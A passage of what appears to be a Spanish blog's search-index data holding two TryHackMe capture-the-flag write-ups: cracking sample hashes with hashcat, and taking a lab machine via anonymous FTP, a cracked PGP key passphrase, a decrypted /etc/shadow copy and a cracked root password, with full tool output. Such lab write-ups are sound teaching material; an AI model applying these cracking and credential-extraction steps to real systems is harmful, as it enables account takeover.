Speed.#1.........: 5 H/s (4.21ms) @ Accel:4 Loops:1 Thr:8 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 3264/14344385 (0.02%) Rejected.........: 0/3264 (0.00%) Restore.Point....: 3264/14344385 (0.02%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:916-917 Candidates.#1....: alucard -\u0026gt; hottie101 Hardware.Mon.#1..: Temp: 71c Util: 92% Core:1189MHz Mem:2505MHz Bus:4 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Crackeada:\nbleh:$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\n#5 MD4 Hash:\n279412f945939ba78ce0758d3fd83daa\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 HASH: 279412f945939ba78ce0758d3fd83daa Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) ------------------------------------------------------------------------- HASHCAT 1 ./hashcat64.bin -m 900 hash.txt rockyou.txt CrackStation Crackeada:\nEternity22:279412f945939ba78ce0758d3fd83daa\nNIVEL 2 #1 SHA256 Hash:\nF09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 HASH: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) ------------------------------------------------------------------------- HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 1400 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule Session..........: hashcat Status...........: Cracked Hash.Type........: SHA2-256 Hash.Target......: f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f...2d0c85 Time.Started.....: Thu Sep 5 16:44:44 2019 (1 sec) Time.Estimated...: Thu Sep 5 16:44:45 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 12297.6 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 196608/14344385 (1.37%) Rejected.........: 0/196608 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; piggy9 Hardware.Mon.#1..: Temp: 60c Util: 0% Core:1189MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 16:44:42 2019 Stopped: Thu Sep 5 16:44:46 2019 CrackStation Crackeada:\nf09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule\n#2 NTLM Hash:\n1DFECA0C002AE40B8619ECF94819CC1B\nEste hash al principio con las herramientas para identificarlo parece como un hash de MD5, al intentar crackearla con el formato de NTLM nos crackeó el hash hashcat.\nHash Analyzer Hash Identification HASHIDENTIfIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 HASH: 1DFECA0C002AE40B8619ECF94819CC1B Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) ------------------------------------------------------------------------- HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1000 md5.hash rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i Session..........: hashcat Status...........: Cracked Hash.Type........: NTLM Hash.Target......: 1dfeca0c002ae40b8619ecf94819cc1b Time.Started.....: Thu Sep 5 18:09:22 2019 (1 sec) Time.Estimated...: Thu Sep 5 18:09:23 2019 (0 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 7257.8 kH/s (3.00ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 5308416/14344385 (37.01%) Rejected.........: 0/5308416 (0.00%) Restore.Point....: 5111808/14344385 (35.64%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#2....: nguy7124 -\u0026gt; muppetme Hardware.Mon.#2..: Temp: 73c Util: 55% Core:1110MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 18:09:21 2019 Stopped: Thu Sep 5 18:09:24 2019 sckull@tars:~/tools$ CrackStation Crackeada:\n1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i\n#3 SHA512 HashInfo:\n1 2 3 Hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. Salt: aReallyHardSalt Rounds: 5 Hash Identification HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1800 sha512.hash rockyou.txt --session sha512 hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt * Uses-64-Bit Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: sha512 Status...........: Running Hash.Type........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Thu Sep 5 18:23:56 2019 (10 mins, 59 secs) Time.Estimated...: Thu Sep 5 19:27:46 2019 (52 mins, 51 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3746 H/s (18.22ms) @ Accel:64 Loops:32 Thr:32 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 2463744/14344385 (17.18%) Rejected.........: 0/2463744 (0.00%) Restore.Point....: 2463744/14344385 (17.18%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2784-2816 Candidates.#2....: จคภจจ/ภ-ึจ -\u0026gt; zz336649 Hardware.Mon.#2..: Temp: 86c Util: 93% Core:1137MHz Mem:2505MHz Bus:4 Crackeada:\n$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:waka99\n#4 SHA1 HashInfo:\n1 2 Hash: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Salt: tryhackme HASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ------------------------------------------------------------------------- HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) ------------------------------------------------------------------------- HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 110 ../hash.sha1 ../rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Minimim salt length supported by kernel: 0 Maximum salt length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; Crackeada:\ne5d8870e5bdd26602cab8dbe07a942c8669e56d6:481616481616\n","description":"Crack The Hash es una serie de retos de TryHackMe que presenta diferentes Hashes las cuales identificamos con hash-identifier y Hash-Analyzer, y crackeamos con Hashcat y CrackStation.","id":191,"section":"posts","tags":["hashcat","hash-identifier"],"title":"TryHackMe - Crack The Hash","uri":"https://sckull.github.io/posts/hashes/"},{"content":"Anonforce es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos un servicio FTP el cual contiene un backup encriptado y su respectiva llave, utilizando John obtuvimos la contraseña, dentro del backup encontramos una copia del archivo /etc/shadow, nuevamente con John obtuvimos la contraseña del usuario root que finalmente nos dio acceso privilegiado.\nRoom Titulo Anonforce Descripción boot2root machine for FIT and bsides guatemala CTF Puntos 60 Dificultad Facil Maker stuxnet MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 root@kali:~/trymehack/anonforce# masscan -p1-65535,U:1-65535 10.10.176.169 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 22:40:02 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 21/tcp on 10.10.176.169 Discovered open port 22/tcp on 10.10.176.169 # Nmap 7.70 scan initiated Tue Sep 3 18:46:02 2019 as: nmap -sV -sC -p22,21 -o nmap.scan 10.10.176.169 Nmap scan report for 10.10.176.169 Host is up (0.37s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 17:42 bin | drwxr-xr-x 3 0 0 4096 Aug 11 17:43 boot | drwxr-xr-x 17 0 0 3700 Sep 03 15:39 dev | drwxr-xr-x 85 0 0 4096 Aug 13 13:09 etc | drwxr-xr-x 3 0 0 4096 Aug 11 17:33 home | lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 17:32 lib | drwxr-xr-x 2 0 0 4096 Aug 11 17:30 lib64 | drwx------ 2 0 0 16384 Aug 11 17:30 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 17:30 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 17:34 opt | dr-xr-xr-x 96 0 0 0 Sep 03 15:39 proc | drwx------ 3 0 0 4096 Aug 11 21:22 root | drwxr-xr-x 18 0 0 540 Sep 03 15:39 run | drwxr-xr-x 2 0 0 12288 Aug 11 17:42 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 17:43 srv | dr-xr-xr-x 13 0 0 0 Sep 03 15:39 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.1.72 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 18:46:29 2019 -- 1 IP address (1 host up) scanned in 27.58 seconds FTP Mediante el puerto 21 de ftp nos logeamos con el usuario y contraseña anonymous, y logramos obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 root@kali:~/trymehack/anonforce# ftp 10.10.176.169 Connected to 10.10.176.169. 220 (vsFTPd 3.0.3) Name (10.10.176.169:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 23 0 0 4096 Aug 11 21:48 . drwxr-xr-x 23 0 0 4096 Aug 11 21:48 .. drwxr-xr-x 2 0 0 4096 Aug 11 17:42 bin drwxr-xr-x 3 0 0 4096 Aug 11 17:43 boot drwxr-xr-x 17 0 0 3700 Sep 03 15:39 dev drwxr-xr-x 85 0 0 4096 Aug 13 13:09 etc drwxr-xr-x 3 0 0 4096 Aug 11 17:33 home lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic drwxr-xr-x 19 0 0 4096 Aug 11 17:32 lib drwxr-xr-x 2 0 0 4096 Aug 11 17:30 lib64 drwx------ 2 0 0 16384 Aug 11 17:30 lost+found drwxr-xr-x 4 0 0 4096 Aug 11 17:30 media drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 notread drwxr-xr-x 2 0 0 4096 Aug 11 17:34 opt dr-xr-xr-x 100 0 0 0 Sep 03 15:39 proc drwx------ 3 0 0 4096 Aug 11 21:22 root drwxr-xr-x 18 0 0 540 Sep 03 15:39 run drwxr-xr-x 2 0 0 12288 Aug 11 17:42 sbin drwxr-xr-x 3 0 0 4096 Aug 11 17:43 srv dr-xr-xr-x 13 0 0 0 Sep 03 15:39 sys drwxrwxrwt 9 0 0 4096 Sep 03 15:39 tmp drwxr-xr-x 10 0 0 4096 Aug 11 17:30 usr drwxr-xr-x 11 0 0 4096 Aug 11 17:30 var lrwxrwxrwx 1 0 0 30 Aug 11 17:42 vmlinuz -\u0026gt; boot/vmlinuz-4.4.0-157-generic lrwxrwxrwx 1 0 0 30 Aug 11 17:42 vmlinuz.old -\u0026gt; boot/vmlinuz-4.4.0-142-generic c226 Directory send OK. ftp\u0026gt; cd home 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 1000 1000 4096 Aug 11 21:22 melodias 226 Directory send OK. ftp\u0026gt; cd melodias 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Aug 11 21:22 user.txt ls226 Directory send OK. ftp\u0026gt; cat user.txt ?Invalid command ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). 226 Transfer complete. 33 bytes received in 0.00 secs (144.5137 kB/s) ftp\u0026gt; exit 221 Goodbye. root@kali:~/trymehack/anonforce# cat user.txt 606083fd33beb1284fc51f411a706af8 root@kali:~/trymehack/anonforce# PGP BACKUP Dentro de la carpeta notread encontramos un archivo pgp y una llave asc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ftp\u0026gt; cd notread 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 . drwxr-xr-x 23 0 0 4096 Aug 11 21:48 .. -rwxrwxrwx 1 1000 1000 524 Aug 11 21:49 backup.pgp -rwxrwxrwx 1 1000 1000 3762 Aug 11 21:49 private.asc 226 Directory send OK. ftp\u0026gt; get backup.pgp local: backup.pgp remote: backup.pgp 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.pgp (524 bytes). 226 Transfer complete. 524 bytes received in 0.00 secs (2.2210 MB/s) ftp\u0026gt; get private.asc local: private.asc remote: private.asc 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for private.asc (3762 bytes). 226 Transfer complete. 3762 bytes received in 0.00 secs (8.4417 MB/s) ftp\u0026gt; Obtenemos la frase del archivo private.asc con gpg2john y con john the ripper.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@kali:~/trymehack/anonforce# gpg2john private.asc \u0026gt; hash File private.asc root@kali:~/trymehack/anonforce# john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2019-09-03 18:59) 8.333g/s 7766p/s 7766c/s 7766C/s xbox360..madalina Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/anonforce# Utilizamos gpg para importar la clave y descencriptar el archivo backup.\nroot@kali:~/trymehack/anonforce# gpg --import private.asc gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed\rgpg: key B92CD1F280AD82C2: secret key imported\rgpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed\rgpg: Total number processed: 2\rgpg: unchanged: 2\rgpg: secret keys read: 1\rgpg: secret keys imported: 1\rroot@kali:~/trymehack/anonforce# gpg --decrypt file.pgp\rgpg: can\u0026#39;t open \u0026#39;file.pgp\u0026#39;: No such file or directory\rgpg: decrypt_message failed: No such file or directory\rroot@kali:~/trymehack/anonforce# gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences\rgpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12\r\u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34;\rroot:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::\rdaemon:*:17953:0:99999:7:::\rbin:*:17953:0:99999:7:::\rsys:*:17953:0:99999:7:::\rsync:*:17953:0:99999:7:::\rgames:*:17953:0:99999:7:::\rman:*:17953:0:99999:7:::\rlp:*:17953:0:99999:7:::\rmail:*:17953:0:99999:7:::\rnews:*:17953:0:99999:7:::\ruucp:*:17953:0:99999:7:::\rproxy:*:17953:0:99999:7:::\rwww-data:*:17953:0:99999:7:::\rbackup:*:17953:0:99999:7:::\rlist:*:17953:0:99999:7:::\rirc:*:17953:0:99999:7:::\rgnats:*:17953:0:99999:7:::\rnobody:*:17953:0:99999:7:::\rsystemd-timesync:*:17953:0:99999:7:::\rsystemd-network:*:17953:0:99999:7:::\rsystemd-resolve:*:17953:0:99999:7:::\rsystemd-bus-proxy:*:17953:0:99999:7:::\rsyslog:*:17953:0:99999:7:::\r_apt:*:17953:0:99999:7:::\rmessagebus:*:18120:0:99999:7:::\ruuidd:*:18120:0:99999:7:::\rmelodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::\rsshd:*:18120:0:99999:7:::\rftp:*:18120:0:99999:7:::\rroot@kali:~/trymehack/anonforce# USER - ROOT Utilizamos nuevamente john para crackear las contraseñas.\nroot@kali:~/trymehack/anonforce# john hash2 --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\rCost 1 (iteration count) is 5000 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rhikari (root)\r1g 0:00:00:02 DONE (2019-09-03 19:02) 0.4901g/s 3388p/s 3388c/s 3388C/s 98765432..better\rUse the 